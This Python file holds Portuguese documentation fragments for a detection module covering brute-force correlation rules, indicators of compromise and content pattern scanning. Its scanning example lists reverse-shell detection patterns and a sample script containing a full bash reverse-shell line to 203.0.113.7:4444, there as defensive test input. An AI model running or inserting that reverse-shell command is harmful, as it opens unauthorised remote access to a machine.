# -*- coding: utf-8 -*-
"""O que foi ESCRITO a mao na pagina de Arcane.Deteccao."""

PROLOGO_TSX = [
    r'''{"p": "Gravar log é fácil e quase inútil sozinho: ninguém lê dez milhões de linhas. O que transforma log em defesa é a **regra** — a afirmação de que uma sequência de eventos significa alguma coisa — e o **alerta**, que é a regra disparando com o contexto junto."}''',

    r'''{"p": "Este módulo é a peça entre [`Seguranca.auditoria`](/docs/biblioteca/seguranca) (que grava) e a pessoa (que precisa saber). Ele é pequeno de propósito: um SIEM de verdade é infraestrutura, e reimplementá-lo em Python daria um subconjunto pior amarrado à linguagem."}''',

    r'''{ code: `adopt Arcane.Deteccao as D

m := D.motor()
m.regra("forca-bruta", quando := "login.falhou", vezes := 5,
    janela := 60.0, gravidade := "alto", attack := "T1110",
    por := "ip", descricao := "cinco falhas na mesma origem")

cycle i from 1 to 4:
    assert len(m.evento("login.falhou", {"ip": "203.0.113.7"})) is 0

novos := m.evento("login.falhou", {"ip": "203.0.113.7"})
assert len(novos) is 1

a := novos[0]
out $"{a['gravidade']} — {a['regra']} ({a['attack']})"
out $"causado por {len(a['eventos'])} eventos"`, title: `uma regra` }''',

    r'''{"h2": "As cinco decisões"}''',

    r'''{"table": {"head": ["Decisão", "Sem ela"], "rows": [
      ["a correlação é por **chave**", "cinco falhas de cinco pessoas diferentes viram um alerta de força bruta — e o alerta que mais custa é o que está errado"],
      ["a janela é **deslizante**", "5 falhas às 23h59 e 5 às 00h01 passam por baixo de duas janelas fixas, e é assim que se contorna um contador por minuto"],
      ["o alerta traz os **eventos que o causaram**", "“força bruta detectada” sem o que aconteceu não é investigável"],
      ["há **supressão**", "a mesma regra disparando mil vezes por minuto é ruído, e ruído é o que faz desligar o alerta"],
      ["a regra que **falha** é contada", "um motor que morre no primeiro erro de regra deixa de detectar tudo o resto — e o silêncio parece calmaria"]
    ]}}''',

    r'''{ code: `adopt Arcane.Deteccao as D

// Cinco falhas de CINCO origens diferentes nao sao forca bruta.
m := D.motor()
m.regra("fb", quando := "login.falhou", vezes := 5, janela := 60.0,
    por := "ip")

cycle ip in ["1.1.1.1", "2.2.2.2", "3.3.3.3", "4.4.4.4", "5.5.5.5"]:
    m.evento("login.falhou", {"ip": ip})

assert len(m.alertas()) is 0`, title: `correlação por chave` }''',

    r'''{"h2": "Indicadores"}''',

    r'''{"p": "Um IOC — hash, IP, domínio, URL — responde *“isto já foi visto num incidente?”*. Ele é **datado e perecível**: um IP malicioso hoje é um IP de nuvem reciclado em três semanas, e um indicador sem prazo vira falso positivo permanente."}''',

    r'''{ code: `adopt Arcane.Deteccao as D

m := D.motor()
ind := m.indicadores()

ind.acrescentar("ip", "198.51.100.66", fonte := "feed-x",
    gravidade := "critico")
ind.acrescentar("dominio", "MAU.EXEMPLO.")

// O mesmo indicador escrito de dois jeitos e o mesmo indicador.
assert ind.ver("dominio", "mau.exemplo") isnt void
assert ind.ver("ip", "8.8.8.8") is void

// 'observar' liga o indicador ao motor: bateu, virou evento.
m.regra("ioc", quando := "indicador.visto", vezes := 1,
    gravidade := "critico")
m.observar("ip", "198.51.100.66", {"onde": "proxy"})

assert len(m.alertas(gravidade_minima := "critico")) is 1`, title: `IOC` }''',

    r'''{"callout": {"tipo": "atencao", "titulo": "Um IOC não prova nada sozinho", "texto": "Um domínio na lista pode ser um colega abrindo um artigo sobre o incidente. IOC é **sinal**, e o valor dele está em somar com outros — é por isso que `observar` produz um *evento*, que entra nas regras, em vez de um veredito."}}''',

    r'''{"h2": "Padrões sobre conteúdo"}''',

    r'''{ code: `adopt Arcane.Deteccao as D

regras := [
    D.padrao("shell-reverso", ["bash -i", "/dev/tcp/", "nc -e"],
        gravidade := "critico"),
    D.padrao("base64-longo", ["[A-Za-z0-9+/]{120,}={0,2}"],
        gravidade := "medio")
]

suspeito := """#!/bin/sh
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
"""

achados := D.varrer(suspeito, regras)
cycle r in achados:
    out $"{r['gravidade']} — {r['regra']} ({r['total']})"
    cycle x in r["achados"]:
        out $"   linha {x['linha']}: {x['padrao']}"`, title: `varrer` }''',

    r'''{"callout": {"tipo": "atencao", "titulo": "Isto não é YARA", "texto": "`varrer` casa expressão regular sobre texto e bytes, o que cobre a parte de YARA que se usa no dia a dia (as strings e a condição). Não há módulo PE, nem operadores de *offset*, nem compilação. Chamá-lo de YARA seria prometer o que não está aqui."}}''',

    r'''{"h2": "O que ele não faz"}''',

    r'''{"table": {"head": ["Não faz", "Porque"], "rows": [
      ["não **envia** alerta", "`ao_alertar` recebe um retorno de chamada, e quem manda para o Slack, o e-mail ou o Telegram é quem chama. Um módulo que escolhesse o canal escolheria errado — e traria uma dependência de rede para o caminho de uma detecção"],
      ["não lê arquivo de log sozinho", "ele recebe eventos. Um leitor embutido teria de adivinhar o formato, e formato de log é a coisa que menos se parece entre dois sistemas. `ler_linha` cobre só o combinado (Apache/nginx), e diz isso"]
    ]}}''',

    r'''{"p": "Guia com contexto: [As ferramentas](/docs/seguranca/ferramentas) e [Ataques a credenciais](/docs/seguranca/ataques)."}''',
]
